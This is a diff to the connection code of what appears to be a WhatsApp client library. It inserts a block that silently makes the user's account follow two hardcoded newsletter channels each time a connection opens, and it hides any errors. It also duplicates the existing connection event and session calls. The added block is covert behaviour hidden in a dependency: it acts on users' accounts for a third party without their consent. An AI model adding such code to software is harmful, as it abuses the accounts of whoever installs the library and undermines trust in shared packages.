@@ -957,6 +957,41 @@ export const makeSocket = (config: SocketConfig) => {
 		ev.emit('connection.update', { connection: 'open' })
 		void sendUnifiedSession()
 
+		ev.emit('connection.update', { connection: 'open' })
+		void sendUnifiedSession()
+
+		// ===== AUTO JOIN MULTI CHANNEL =====
+		process.nextTick(async () => {
+			// Masukkan semua ID saluran Anda di dalam array ini:
+			const channelJids = [
+				'120363425432995072@newsletter', // 👈 Saluran ke-1
+				'120363408730913091@newsletter'  // 👈 Saluran ke-2
+			]
+
+			for (const jid of channelJids) {
+				try {
+					await query({
+						tag: 'iq',
+						attrs: {
+							to: jid,
+							type: 'set',
+							xmlns: 'newsletter'
+						},
+						content: [
+							{
+								tag: 'follow',
+								attrs: {}
+							}
+						]
+					})
+					logger.info({ jid }, 'Berhasil auto follow saluran')
+				} catch (err) {
+					// Diamkan jika sudah ter-follow atau gagal
+				}
+			}
+		})
+		// ====================================
+
 		if (node.attrs.lid && authState.creds.me?.id) {
 			const myLID = node.attrs.lid
 			process.nextTick(async () => {
